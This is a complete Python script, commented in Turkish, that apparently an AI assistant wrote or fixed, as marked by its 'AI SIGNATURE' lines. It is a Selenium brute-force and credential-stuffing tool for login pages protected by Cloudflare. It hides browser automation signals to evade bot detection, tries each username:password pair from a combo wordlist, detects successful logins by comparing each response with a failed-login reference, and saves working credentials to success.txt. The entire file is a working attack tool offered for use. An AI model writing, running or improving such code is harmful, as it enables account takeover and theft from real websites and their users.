# --- AI SIGNATURE: JS-EVENT-FIX-SCRIPT-COMPLETE ---
import argparse
import sys
import time
from tqdm import tqdm
from colorama import Fore, Style, init

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.common.exceptions import NoSuchElementException, WebDriverException, TimeoutException
except ImportError:
    print(f"{Fore.RED}[!] Selenium kütüphanesi bulunamadı. Lütfen 'pip install selenium' ile kurun.")
    sys.exit(1)

init(autoreset=True)

def set_input_value_and_trigger_events(driver, element, value):
    """Input değerini JS ile set eder ve modern frameworklerin kullandığı olayları tetikler."""
    driver.execute_script("""
        var input = arguments[0];
        var value = arguments[1];
        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
        nativeInputValueSetter.call(input, value);
        var event = new Event('input', { bubbles: true });
        input.dispatchEvent(event);
        var event2 = new Event('change', { bubbles: true });
        input.dispatchEvent(event2);
    """, element, value)

print("DEBUG: Script başladı.")

parser = argparse.ArgumentParser(description="Selenium ile Cloudflare korumalı login brute force aracı (combo wordlist)")
parser.add_argument('--url', required=True, help='Hedef login sayfası URL')
parser.add_argument('--combo', required=True, help='Combo wordlist dosyası (username:password)')
parser.add_argument('--browser', default='firefox', choices=['chrome', 'firefox'], help='Kullanılacak tarayıcı (chrome veya firefox)')
parser.add_argument('--headless', action='store_true', help='Tarayıcıyı arka planda (görünmeden) çalıştır')
args = parser.parse_args()
print("DEBUG: Argümanlar okundu.")

# URL'yi temizle ve yaygın yazım hatalarını düzelt
print(f"DEBUG: Orijinal URL: '{args.url}'")
args.url = args.url.strip()
if args.url.startswith("http//"):
    args.url = "http://" + args.url[6:]
    print(f"DEBUG: URL düzeltildi: '{args.url}'")
elif args.url.startswith("https//"):
    args.url = "https://" + args.url[7:]
    print(f"DEBUG: URL düzeltildi: '{args.url}'")

if not (args.url.startswith("http://") or args.url.startswith("https://")):
    print(f"{Fore.RED}[!] Geçersiz URL formatı. URL http:// veya https:// ile başlamalıdır.")
    sys.exit(1)

combos = []
try:
    with open(args.combo, encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or ':' not in line:
                continue
            username, password = line.split(':', 1)
            combos.append((username, password))
except FileNotFoundError:
    print(f"{Fore.RED}[!] Wordlist dosyası bulunamadı: {args.combo}")
    sys.exit(1)

print(f"[+] {len(combos)} combo (username:password) yüklendi.")
if not combos:
    print(f"{Fore.YELLOW}[!] Wordlist boş veya geçersiz formatta. Tarama başlatılamıyor.")
    sys.exit(1)

# Tarayıcıya göre seçenekleri ayarla
print(f"DEBUG: Tarayıcı '{args.browser}' için ayarlar yapılıyor.")
if args.browser == 'chrome':
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    options = ChromeOptions()
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
else: # firefox
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    options = FirefoxOptions()

if args.headless:
    print(f"DEBUG: {args.browser} headless (arka plan) modda çalıştırılıyor.")
    options.add_argument('--headless')
else:
    print(f"DEBUG: {args.browser} görünür tarayıcı modunda çalıştırılıyor.")

options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-gpu')
options.add_argument('--window-size=1280x800')

success_log = open('success.txt', 'w', encoding='utf-8')
driver = None

try:
    print(f"DEBUG: {args.browser} tarayıcı başlatılıyor...")
    if args.browser == 'chrome':
        driver = webdriver.Chrome(options=options)
    else:
        driver = webdriver.Firefox(options=options)
    print("DEBUG: Tarayıcı başlatıldı.")

    if args.browser == 'chrome':
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

    driver.set_page_load_timeout(60)
    print(f"DEBUG: {args.url} adresine gidiliyor...")
    driver.get(args.url)
    time.sleep(5)
    print("[+] Ana sayfaya erişildi.")

    print("DEBUG: Login formu ve inputlar aranıyor...")
    form = driver.find_element(By.TAG_NAME, 'form')
    inputs = form.find_elements(By.TAG_NAME, 'input')
    user_input = None
    pass_input = None
    for inp in inputs:
        inp_type = inp.get_attribute('type')
        if inp_type in ['text', 'email', 'user'] and not user_input:
            user_input = inp
        elif inp_type == 'password':
            pass_input = inp

    if not user_input or not pass_input:
        raise Exception("Kullanıcı adı veya şifre inputu bulunamadı!")

    print(f"[+] Login formu bulundu: user='{user_input.get_attribute('name')}', pass='{pass_input.get_attribute('name')}'")

    print("DEBUG: Başarısız giriş denemesiyle referans alınıyor...")
    set_input_value_and_trigger_events(driver, user_input, "wronguser")
    set_input_value_and_trigger_events(driver, pass_input, "wrongpass")
    form.submit()
    time.sleep(3)
    fail_url = driver.current_url
    fail_html = driver.page_source
    print(f"DEBUG: Başarısızlık URL'i: {fail_url}")

    with tqdm(total=len(combos), desc="Kombinasyonlar deneniyor", unit="combo") as pbar:
        for username, password in combos:
            try:
                if driver.current_url != args.url:
                    driver.get(args.url)
                    time.sleep(2)

                form = driver.find_element(By.TAG_NAME, 'form')
                inputs = form.find_elements(By.TAG_NAME, 'input')
                user_input = None
                pass_input = None
                for inp in inputs:
                    inp_type = inp.get_attribute('type')
                    if inp_type in ['text', 'email', 'user'] and not user_input:
                        user_input = inp
                    elif inp_type == 'password':
                        pass_input = inp

                if user_input and pass_input:
                    set_input_value_and_trigger_events(driver, user_input, username)
                    set_input_value_and_trigger_events(driver, pass_input, password)
                    time.sleep(0.1)
                    form.submit()
                    time.sleep(3)

                    if driver.current_url != fail_url or driver.page_source != fail_html:
                        tqdm.write(Fore.GREEN + Style.BRIGHT + f"\n[!!!] BAŞARILI: {username}:{password}")
                        success_log.write(f"{username}:{password}\n")
                        success_log.flush()
                else:
                    tqdm.write(Fore.RED + "Döngü içinde form inputları bulunamadı.")

            except (NoSuchElementException, TimeoutException) as e:
                pbar.set_postfix_str(f"Form hatası: {e}", refresh=True)
                time.sleep(1)
            except Exception as e:
                pbar.set_postfix_str(f"Genel Hata: {e}", refresh=True)
                try:
                    driver.quit()
                except: pass
                if args.browser == 'chrome':
                    driver = webdriver.Chrome(options=options)
                else:
                    driver = webdriver.Firefox(options=options)
                driver.get(args.url)
            
            pbar.update(1)

except Exception as e:
    print(f"\n{Fore.RED}KRİTİK HATA: {e}")
finally:
    if driver:
        driver.quit()
        print("DEBUG: Tarayıcı kapatıldı.")
    success_log.close()
    print("\n[+] Tarama tamamlandı.")

# --- AI SIGNATURE: JS-EVENT-FIX-SCRIPT-COMPLETE-BITIS --- 